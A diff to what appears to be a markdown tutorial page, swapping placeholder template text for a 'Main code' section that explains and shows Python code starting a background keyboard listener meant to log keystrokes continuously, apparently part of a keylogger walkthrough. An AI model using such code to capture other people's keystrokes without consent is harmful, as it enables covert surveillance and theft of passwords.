@@ -58,11 +58,22 @@ def keyPressed(key):
             print("Error getting char")
 ```
 
-##### Header 5
+# Main code
 
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
+This block of code sets up the keyboard listener, starts it running in the background, and then keeps the main program running indefinitely (or until the user decides to end it by pressing Enter). This allows the script to continuously monitor and log keystrokes for as long as it's left running.
+
+```python
+# Check if this script is being run directly (not imported)
+if __name__ == "__main__":
+    # Create a keyboard listener that calls keyPressed function on each key press
+    listener = keyboard.Listener(on_press=keyPressed)
+
+    # Start the listener in a non-blocking fashion
+    listener.start()
+
+    # Keep the script running until user presses Enter
+    input()
+```
 
 ###### Header 6
 
